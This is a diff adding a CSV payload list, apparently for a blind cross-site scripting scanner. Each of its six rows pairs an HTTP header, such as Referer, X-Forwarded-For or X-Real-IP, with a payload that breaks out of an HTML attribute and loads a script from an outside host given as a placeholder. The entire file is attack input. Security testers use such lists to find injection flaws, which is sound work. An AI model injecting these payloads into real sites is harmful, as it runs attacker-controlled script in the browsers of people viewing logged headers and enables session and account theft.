@@ -1,0 +1,6 @@
+header,X-Forwarded-Proto,"><script src="https://%s/"></script>
+header,Referer,"><script src="https://%s/"></script>
+header,X-Forwarded-For,"><script src="https://%s/"></script>
+header,True-Client-IP,"><script src="https://%s/"></script>
+header,X-Client-IP,"><script src="https://%s/"></script>
+header,X-Real-IP,"><script src="https://%s/"></script>
